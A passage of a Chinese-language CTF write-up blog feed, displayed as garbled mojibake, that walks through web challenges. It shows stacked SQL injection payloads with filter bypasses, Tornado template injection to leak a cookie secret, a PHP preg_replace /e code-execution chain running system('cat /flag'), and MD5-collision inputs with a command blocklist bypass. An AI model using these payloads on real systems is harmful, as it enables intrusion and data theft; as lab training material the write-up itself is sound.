â€œâ€<br><br>}</p><p>é‡Œé¢æœ‰ç”¨çš„æ˜¯3åˆ—ï¼Œstringç±»å‹çš„ï¼Œè·Ÿæˆ‘ä»¬1â€™ or 1=1#å‡ºæ¥çš„å†…å®¹ä¸å¤§ç›¸ä¼¼</p><p>ç„¶åæŸ¥çœ‹ä¸€ä¸‹wordsè¿™ä¸ªè¡¨</p><p>array(6) {<br><br>  [0]=&gt;<br><br>  string(2) â€œidâ€<br><br>  [1]=&gt;<br><br>  string(7) â€œint(10)â€<br><br>  [2]=&gt;<br><br>  string(2) â€œNOâ€<br><br>  [3]=&gt;<br><br>  string(0) â€œâ€<br><br>  [4]=&gt;<br><br>  NULL<br><br>  [5]=&gt;<br><br>  string(0) â€œâ€<br><br>}</p><p>array(6) {<br><br>  [0]=&gt;<br><br>  string(4) â€œdataâ€<br><br>  [1]=&gt;<br><br>  string(11) â€œvarchar(20)â€<br><br>  [2]=&gt;<br><br>  string(2) â€œNOâ€<br><br>  [3]=&gt;<br><br>  string(0) â€œâ€<br><br>  [4]=&gt;<br><br>  NULL<br><br>  [5]=&gt;<br><br>  string(0) â€œâ€</p><p>å¯ä»¥æƒŠå–œçš„å‘ç°ï¼Œå®ƒç¬¬ä¸€ä¸ªæ•°ç»„é‡Œé¢æœ‰ä¸€ä¸ªidï¼Œç„¶åç¬¬äºŒä¸ªæ˜¯dataï¼Œæ‰€ä»¥æ­¤åˆ»æˆ‘ä»¬æœ‰ç†ç”±æ€€ç–‘ï¼Œ1â€™ or 1=1#çš„å‡ºæ¥çš„æ•°æ®å°±æ˜¯wordsè¿™ä¸ªè¡¨é‡Œé¢çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½æŠŠwordsè¿™ä¸ªè¡¨æ”¹åæˆåˆ«çš„ï¼Œç„¶åå†æŠŠFlagHereè¿™ä¸ªè¡¨æ”¹ä¸ºwordsï¼Œç„¶åå†å°†dataå­—æ®µåæ¦‚ç‡è®º</p><p>å°è¯•ä¿®æ”¹wordsçš„åå­—å’Œå­—æ®µdata</p><p>alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</p><p>flag{a29fba37-6b85-4157-bd97-dd638d430d8b}</p><p>æœ‰ä¸€ç‚¹ï¼Œå †å æ³¨å…¥æˆ‘ä¸çŸ¥é“æœ‰è¦æ±‚è¿˜æ˜¯å•¥ï¼Œä¸ä¸€æ¬¡æ€§æŠŠè¯­å¥å†™å®Œï¼Œä¸ä¸€å®šèƒ½æ‹¿åˆ°flagã€‚</p><h2>æ–¹æ³•äºŒ é¢„å¤„ç†ï¼Œå †å æ³¨å…¥</h2>ä¸ä½¿ç”¨å˜é‡<li>é¢„å®šä¹‰sqlè¯­å¥  prepare name from '[my sql squece]';<li>æ‰§è¡Œé¢„å®šä¹‰è¯­å¥  execute name;<li >æ˜¯åˆ é™¤é¢„å®šä¹‰æ‰§è¡Œè¯­å¥(deallocate||drop) prepare name;<p>é¢„å®šä¹‰è¯­å¥ä¹Ÿå¯ä»¥é€šè¿‡è¡¨æ˜è¿›è¡Œä¼ å‚</p><li>set @tn='hahaha';//å­˜å‚¨è¡¨æ˜<li>set @sql=concat('select * from',@tn);//å­˜å‚¨sqlè¯­å¥<li>prepare name from @sql;//é¢„å®šä¹‰sqlè¯­å¥<li>execute name;//æ‰§è¡Œé¢„å®šä¹‰sqlè¯­å¥<li>(deallocate||drop) prepare name;//åˆ é™¤é¢„å®šä¹‰è¯­å¥<p>æœ¬é¢˜ç›®å› ä¸ºè¿‡æ»¤äº†selectã€‚æ‰€ä»¥ç”¨asciiå¯¹selectè¿›è¡Œç¼–ç char(115, 101, 108, 101, 99, 116)</p><p>ä½¿ç”¨æ— å˜é‡ç‰ˆï¼š</p><p>1â€™;prepare name from concat(char(115, 101, 108, 101, 99, 116),â€™ * from `1919810931114514`â€˜);execute name;#</p><p>1â€™;prepare name from concat(â€˜selecâ€™,â€™tâ€™,â€™ * from `1919810931114514`â€˜);execute name;#<br>(concatæ˜¯è¿æ¥å­—ç¬¦çš„ï¼Œå…·ä½“å¯å‚è€ƒsql1~10)</p><p>ä½¿ç”¨å˜é‡</p><p>1â€™;set @sqli=concat(char(115,101,108,101,99,116),â€™* from `1919810931114514`â€˜);prepare hacker from @sqli;execute hacker;#</p><p>æŠ¥é”™äº†ï¼Œè¯´æ˜æœ‰é˜²å¾¡æœºåˆ¶ï¼Œè¿™ç§æ–¹æ³•ä¸å¯è¡Œï¼Œstrstr($inject, â€œsetâ€) &amp;&amp; strstr($inject, â€œprepareâ€)</p><p>ä½†æ˜¯ï¼Œè¿™ä¸ªæ—¶ä¸ä¼šç•¥å¤§å°å†™çš„ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠset prepareè½¬æˆå¤§å†™</p><p>1â€™;SET @sqli=concat(char(115,101,108,101,99,116),â€™* from `1919810931114514`â€˜);PREPARE hacker from @sqli;EXECUTE hacker;#</p><p>OK</p><h2>GYCTF2020 Blacklist</h2><p>return preg_match(â€œ/set|prepare|alter|rename|select|update|delete|drop|insert|where|./iâ€,$inject);</p><p>è¿™ä¸ªæŠŠset prepare alter renameå…¨éƒ½è¿‡æ»¤äº†</p><p>æ‰€ä»¥è¿™é‡Œå¼•ç”¨ä¸€ä¸ªæ–°çš„æ–¹æ³•handler</p><p>1â€™;handler FlagHere open;handler FlagHere read first;#</p><p>handler table_name open//æ‰“å¼€ä¸€ä¸ªå¥æŸ„</p><p>handler table_name read firse//è¯»ç¬¬ä¸€è¡Œ</p><p>handler table_name read next//éƒ½ä¸‹ä¸€è¡Œ</p><p>handler table_name close//å…³é—­å¥æŸ„</p><p>flag{d1ce3c20-07a8-43dc-a903-67509a8a5a43}å¾—åˆ°</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easy_tornado</title>
      <link href="/2021/03/02/easy-tornado/"/>
      <url>/2021/03/02/easy-tornado/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2>è¿™ä¸€é¢˜</h2><p>å‰ç½®çŸ¥è¯†</p><p>tornado renderæ˜¯pythonçš„æ¸²æŸ“å‡½æ•°ï¼Œå¦‚æœç”¨æˆ·å¯¹renderçš„å†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥è¾“å…¥xssä»£ç ï¼Œè€Œä¸”è¯å¯ä»¥{}ä¸­é—´å†æ¥ä¸€ä¸ª{}ï¼ˆå¦‚æœç›´æ¥é‚£æ ·æ­£ä¸èƒ½éƒ¨ç½²åˆ°gitä¸Šé¢ï¼‰è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</p><p><img src="3.PNG"> </p><p>å½“ç”¨æˆ·è®¿ç™»å½•çš„æ—¶å€™æˆ‘ä»¬å°±å¾—ç»™ä»–å†™cookieäº†,ä½†æ˜¯è¿™é‡Œæ²¡æœ‰å†™åœ¨å“ªé‡Œå†™äº†å‘¢?</p><p> åœ¨å“ªé‡Œå‘¢?ä¹‹å‰å†™çš„Handleréƒ½æ˜¯ç»§æ‰¿çš„RequestHandler,è¿™æ¬¡ç»§æ‰¿çš„æ˜¯BaseHandleræ˜¯è‡ªå·±å†™çš„Handler<br>  ç»§æ‰¿è‡ªå·±çš„ç±»,åœ¨ç±»äº†åŠ æ‰©å±•initialize! åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œåšè·å–ç”¨æˆ·cookieæˆ–è€…å†™cookieéƒ½å¯ä»¥åœ¨è¿™é‡Œåš</p><p> æˆ‘ä»¬çŸ¥é“LoginHandlerå¯¹è±¡å°±æ˜¯self,æˆ‘ä»¬å¯ä¸å¯ä»¥self.set_cookie()</p><p># self.set_cookie()<br>   # self.get_cookie()<br>   self.render(â€˜login.htmlâ€™, **{â€˜statusâ€™: â€˜â€™})</p><p>def login(request):</p><p>#è·å–ç”¨æˆ·è¾“å…¥<br> login_form = AccountForm.LoginForm(request.POST)</p><p> if request.method == â€˜POSTâ€™:</p><p>#åˆ¤æ–­ç”¨æˆ·è¾“å…¥æ˜¯å¦åˆæ³•<br>   if login_form.is_valid():#å¦‚æœç”¨æˆ·è¾“å…¥æ˜¯åˆæ³•çš„<br>   username = request.POST.get(â€˜usernameâ€™)<br>   password = request.POST.get(â€˜passwordâ€™)</p><p>   if models.UserInfo.objects.get(username=username) and models.UserInfo.objects.get(username=username).password == password:</p><p>   request.session[â€˜auth_userâ€™] = username</p><p>   return redirect(â€˜/index/â€˜)</p><p>   else:<br>   return render(request,â€™account/login.htmlâ€™,{â€˜modelâ€™: login_form,â€™backend_autherrorâ€™:â€™ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€™})</p><p>   else:<br>   error_msg = login_form.errors.as_data()</p><p>  return render(request,â€™account/login.htmlâ€™,{â€˜modelâ€™: login_form,â€™errorsâ€™:error_msg})<br>   # å¦‚æœç™»å½•æˆåŠŸï¼Œå†™å…¥sessionï¼Œè·³è½¬index</p><p>  return render(request, â€˜account/login.htmlâ€™, {â€˜modelâ€™: login_form}</p><p>ç”±ä¸Šé¢å¯çŸ¥:renderæ˜¯ä¸€ä¸ªç±»ä¼¼æ¨¡æ¿çš„ä¸œè¥¿ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°æ¥è®¿é—®ç½‘é¡µ<br>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œä¾‹å¦‚</p><pre><code>     &#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;</code></pre><p>è¿™{}ä¸­é—´å†æ¥ä¸€ä¸ª{}å’Œè¿™ä¸ªå­—å…¸å¯¹è±¡ä¹Ÿè®¸å¤§å®¶å°±çœ‹å‡ºæ¥äº†ï¼Œæ²¡é”™å°±æ˜¯è¿™ä¸ªhandler.settingså¯¹è±¡<br>handler æŒ‡å‘RequestHandler</p><p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p><p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</p><p>å¤§æ¦‚å°±æ˜¯è¯´ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬æ­£æ˜¯ä»è¿™é‡Œè·å–çš„cookie_secret</p><p>å¾—åˆ°<br>92a84b19-b7cb-4cb7-a474-c2c49c4873f4</p><p><img src="1.PNG"></p><p>è„šæœ¬</p><p><img src="2.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¬è™«</title>
      <link href="/2021/03/01/%E7%88%AC%E8%99%AB/"/>
      <url>/2021/03/01/%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>1.æœç‹—</p><p><img src="3.PNG"></p><p>2.ç™¾åº¦ç¿»è¯‘</p><p><img src="2.PNG"></p><p>3.è±†ç“£</p><p><img src="1.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</title>
      <link href="/2021/03/01/%E6%AD%A4%E6%96%B9%E6%B3%95%E3%80%81%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
      <url>/2021/03/01/%E6%AD%A4%E6%96%B9%E6%B3%95%E3%80%81%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code>&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;))&#123;       echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;       if(preg_match(&quot;/flag/&quot;,$file))&#123;          die(&quot;Not now!&quot;);       &#125;       include($file);  //next.php&#125;else&#123;      highlight_file(__FILE__);&#125;?&gt;</code></pre><p>ä¸»è¦çš„é—®é¢˜åœ¨äºæˆ‘ä¸çŸ¥é“file_get_contents($text,â€™râ€™)ä¸­çš„ræ˜¯ä»€ä¹ˆæ„æ€<br>æˆ‘ä»¥ä¸ºæ˜¯readï¼Œç„¶åæˆ‘è‡ªå·±å®éªŒçš„æ˜¯</p><pre><code>&lt;?php$text=&#39;I have a dream&#39;;print_r(file_get_contents($text,&#39;r&#39;));?&gt;</code></pre><p>ä½†æ˜¯æŠ¥é”™äº†</p><p>åœ¨ç½‘ä¸Šçœ‹åˆ°è¿™ç§ç±»å‹çš„è§£å†³æ–¹æ³•ï¼Œæœ€åè¯´ä¸€ä¸‹</p><p>ç°åœ¨æ˜¯å¾—åˆ°äº†next.phpçš„å†…å®¹</p><pre><code>&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;    return preg_replace(       &#39;/(&#39; . $re . &#39;)/ei&#39;,       &#39;strtolower(&quot;\\1&quot;)&#39;,       $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;   echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><p>è¿™ä¸€ç‚¹ï¼ŒçŒœæµ‹ä¸€å®šè¦è§¦å‘getflagï¼ˆï¼‰å‡½æ•°ï¼Œé‚£ä¹ˆé—®é¢˜çš„ç‚¹ä¸€å®šåœ¨complexè¿™ä¸ªå‡½æ•°è¿™é‡Œï¼Œåˆæ­¥æƒ³æ³•æ˜¯åœ¨complexè¿™é‡Œæ„é€ å‡ºæ¥getflag</p><p>å…ˆè¯´return preg_replace(<br>           â€˜/(â€˜ . $re . â€˜)/eiâ€™,<br>           â€˜strtolower(â€œ\1â€)â€™,<br>           $str<br>        );</p><p>preg_replaceå¯èƒ½ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p><pre><code>foreach ($_GET as $regex =&gt; $value) &#123;    preg_replace(&#39;/(&#39; . $regex . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$value);&#125;</code></pre><p>s_â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“{${phpinfo()}}â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“{${phpinfo()}} </p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„æ˜¯S+ä½†æ˜¯æ•°å‡ºæ¥å˜æˆs_</p><p>phpè‡ªèº«åœ¨è§£æè¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœå‚æ•°åå­—ä¸­åŒ…å«ç©ºæ ¼ã€.ã€[ç­‰å­—ç¬¦ï¼Œä¼šå°†ä»–ä»¬è½¬æ¢æˆ_ã€‚</p><p>å¦‚æœåœ¨preg_replaceä¸­ä½¿ç”¨/eä¿®é¥°ç¬¦ï¼Œä¼šå°† replacement å‚æ•°å½“ä½œ php ä»£ç ï¼Œå¹¶ä¸”ä»¥ eval å‡½æ•°çš„æ–¹å¼æ‰§è¡Œï¼Œå‰ææ˜¯ subject ä¸­æœ‰ pattern çš„åŒ¹é…</p><p><img src="1.png"></p><p>å›¾ä¸­å®é™…ä¸Šé€šè¿‡ eval æ‰§è¡Œçš„æ˜¯ strtolower å‡½æ•°ã€‚åˆ†åˆ«å®é™…æ‰§è¡Œçš„æ˜¯ï¼š</p><p>strtolower(â€œJUST TESTâ€);</p><p>strtolower(â€œPHPINFO()â€);</p><p>strtolower(â€œ{${PHPINFO()}}â€);</p><p>ç¬¬ä¸‰ä¸ªä¹‹æ‰€ä»¥å¯ä»¥æ‰§è¡Œä»£ç ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬é€šè¿‡å¤æ‚ï¼ˆèŠ±æ‹¬å·ï¼‰è¯­æ³•çš„æ–¹å¼æ¥è®©å…¶ä»£ç æ‰§è¡Œã€‚</p><p>å›åˆ°æºä»£ç ä¸­ï¼Œæˆ‘ä»¬å†ç†è§£ä¸€ä¸‹ï¼š</p><pre><code>   foreach ($_GET as $regex =&gt; $value) &#123;    preg_replace(&#39;/(&#39; . $regex . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$value);&#125;</code></pre><p>è¿™é‡Œçš„ replacement æ˜¯ strtolower(â€œ\1â€) ï¼Œç€é‡ç†è§£ä¸€ä¸‹ \1 ã€‚</p><p>æ¯ä¸ªè¿™æ ·çš„å¼•ç”¨å°†è¢«åŒ¹é…åˆ°çš„ç¬¬nä¸ªæ•è·å­ç»„æ•è·åˆ°çš„æ–‡æœ¬æ›¿æ¢ã€‚ nå¯ä»¥æ˜¯0-99ï¼Œ\0å’Œ$0ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬ã€‚</p><p>è¿™é‡Œçš„ $1$2$4 ç­‰åŒäºä¸Šé¢çš„ \1\2\4 çš„ä½œç”¨ï¼Œå› æ­¤æˆ‘ä»¬çœ‹ä¸€ä¸‹æ˜¯æ€ä¹ˆé€‰æ‹©åŒ¹é…çš„ã€‚</p><p>$1 $2   $3 $4<br>â€˜/(.<em>)(?|&amp;)â€™ . $key . â€˜=[^&amp;]+?(&amp;)(.</em>)/iâ€™</p><p>å›åˆ°é¢˜ç›®</p><p>æœ€åæ„é€ <br>?\S*=${getFlag()}&amp;cmd=system(â€˜cat /flagâ€™);å¾—åˆ°flag</p><p>æˆ‘æ„Ÿè§‰é—®é¢˜åº”è¯¥æ˜¯å¤„åœ¨file_get_content(),æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œä½†æ˜¯å‰é¢æˆ‘è¾“å…¥çš„æ˜¯text=i have a dreamï¼Œè¿™æ˜¯å­—ç¬¦ä¸²ä¸æ˜¯æ–‡ä»¶ï¼Œè¿™æ˜¯å®éªŒæ—¶çš„æŠ¥é”™ä¿¡æ¯ file_get_contents($text): failed to open stream: No such file or directory ï¼Œæ‰€ä»¥è¦æƒ³æ€ä¹ˆæ‰èƒ½åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</p><p>php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚ POST è¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œæœ€å¥½ä½¿ç”¨ php://input æ¥ä»£æ›¿ $HTTP_RAW_POST_DATAï¼Œå› ä¸ºå®ƒä¸ä¾èµ–äºç‰¹å®šçš„ php.ini æŒ‡ä»¤ã€‚ è€Œä¸”ï¼Œè¿™æ ·çš„æƒ…å†µä¸‹ $HTTP_RAW_POST_DATA é»˜è®¤æ²¡æœ‰å¡«å……ï¼Œ æ¯”æ¿€æ´» always_populate_raw_post_data æ½œåœ¨éœ€è¦æ›´å°‘çš„å†…å­˜ã€‚ enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚ </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easyweb</title>
      <link href="/2021/02/28/web/"/>
      <url>/2021/02/28/web/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ‰“å¼€æ³¨æ„åˆ°url img=TXpVek5UTTFNbVUzTURabE5qYz0ï¼Œå°è¯•è§£ç MzUzNTM1MmU3MDZlNjc=ï¼Œç»§ç»­3535352e706e67ï¼Œç»§ç»­555.pngï¼Œæ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œå½“æ˜¯ä¸ºä»€ä¹ˆè¦é‡å¤è¿™ä¹ˆå¤šæ¬¡ï¼Œç¼–ç 3535352E706E67ï¼ŒGM2TGNJTGUZEKNZQGZCTMNY=ï¼Œè¿™é‡Œè·Ÿä¹‹å‰ä¸ä¸€æ ·äº†R00yVEdOSlRHVVpFS05aUUdaQ1RNTlk9ï¼Œä½†æ˜¯ä¾æ—§æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæ³¨æ„åˆ°ï¼Œå½“æˆ‘å»æ‰imgçš„æ—¶å€™ï¼Œä¼šåˆ·æ–°ç½‘é¡µï¼Œè‡ªåŠ¨å›æ¥ï¼Œbpè¯•è¯•ï¼Œæ³¨æ„åˆ°å“åº”å¤´ï¼šRefresh: 0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ï¼Œæ²¡ç”¨ï¼Œå°è¯•ä¿®æ”¹å°†imgä¿®æ”¹ä¸ºï¼Œindex.phpç±»ä¼¼555.pngçš„åšæ³•</p><p>696E6465782E706870</p><p>GY4TMRJWGQ3DKNZYGJCTOMBWHA3TA===</p><p>R1k0VE1SSldHUTNES05aWUdKQ1RPTUJXSEEzVEE9PT0=</p><p>å¤±è´¥ï¼Œä½†æ˜¯åº”è¯¥å°±æ˜¯è¿™æ ·åšçš„</p><p>æˆ‘åœ¨è¯•è¯•555.pngï¼Œæˆ‘å½“æ—¶base64ï¼Œç”¨äº†ä¸¤æ¬¡ï¼Œbase16ç”¨æ¥ä¸€æ¬¡</p><p>æ‰€ä»¥ï¼Œ</p><p>å†æ¥</p><p>ç¬¬ä¸€æ¬¡base16ï¼š696E6465782E706870</p><p>ç¬¬äºŒæ¬¡base64ï¼šNjk2RTY0NjU3ODJFNzA2ODcw</p><p>ç¬¬ä¸‰æ¬¡base64ï¼šTmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p><p>æ³¨æ„ï¼šPD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=</p><p>åº”è¯¥æ˜¯æºç <br>&lt;?php</p><p>error_reporting(E_ALL || ~ E_NOTICE);</p><p>header(â€˜content-type:text/html;charset=utf-8â€™);</p><p>$cmd = $_GET[â€˜cmdâ€™];</p><p>if (!isset($_GET[â€˜imgâ€™]) || !isset($_GET[â€˜cmdâ€™])) </p><p>   header(â€˜Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=â€™);</p><p>$file = hex2bin(base64_decode(base64_decode($_GET[â€˜imgâ€™])));</p><p>$file = preg_replace(â€œ/[^a-zA-Z0-9.]+/â€œ, â€œâ€, $file);</p><p>if (preg_match(â€œ/flag/iâ€, $file)) {</p><p>   echo â€˜<img src ="./ctf3.jpeg">â€˜;</p><p>   die(â€œxixiï½ no flagâ€);</p><p>} else {</p><p>   $txt = base64_encode(file_get_contents($file));</p><p>   echo â€œ<img src='data:image/gif;base64," . $txt . "'></img>â€œ;</p><p>   echo â€œ<br>â€œ;<br>}</p><p>echo $cmd;</p><p>echo â€œ<br>â€œ;</p><p>if (preg_match(â€œ/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|&#39;|&quot;|`|;|,|*|?|\|\\|\n|\t|\r|\xA0|{|}|(|)|&amp;[^\d]|@|||\$|[|]|{|}|(|)|-|&lt;|&gt;/iâ€, $cmd)) {</p><p>   echo(â€œforbid ~â€);</p><p>   echo â€œ<br>â€œ;</p><p>} else {</p><p>   if ((string)$_POST[â€˜aâ€™] !== (string)$_POST[â€˜bâ€™] &amp;&amp; md5($_POST[â€˜aâ€™]) === md5($_POST[â€˜bâ€™])) {<br>    echo <code>$cmd</code>;<br>   } else {<br>    echo (â€œmd5 is funny ~â€);<br>    }<br>}</p><p>?&gt;</p><html><style>  body{   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;}</style><body></body></html><p>å› ä¸ºè¦è¿ç”¨åˆ°md5å‡½æ•°</p><p>$Param1=â€\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2â€;<br>$Param2=â€\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2â€;</p><p>ç”¨çš„a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br>æˆåŠŸ</p><p>å¯ä»¥çœ‹å‡ºï¼ŒæŸ¥çœ‹ç›®å½•çš„lsï¼Œè¢«è¿‡æ»¤ï¼Œçªç„¶æƒ³åˆ°è¿˜æœ‰dirä¹Ÿå¯ä»¥æŸ¥çœ‹</p><p>dir%20/ï¼Œå¯ä»¥çœ‹åˆ°æœ‰flag</p><p>å¹¶ä¸”ï¼Œè¯»å–æ–‡ä»¶å†…å®¹å¾—å¾ˆå¤šå‘½ä»¤éƒ½è¢«è¿‡æ»¤ï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€äº›ç»•è¿‡æ‰‹æ³•ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥çœ‹å‡ºæ¼äº†ä¸€ä¸ªsortï¼Œè¿˜æœ‰uniqï¼Œå¾—åˆ°flag</p><p>(1)more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</p><p>(2)less:ä¸ more 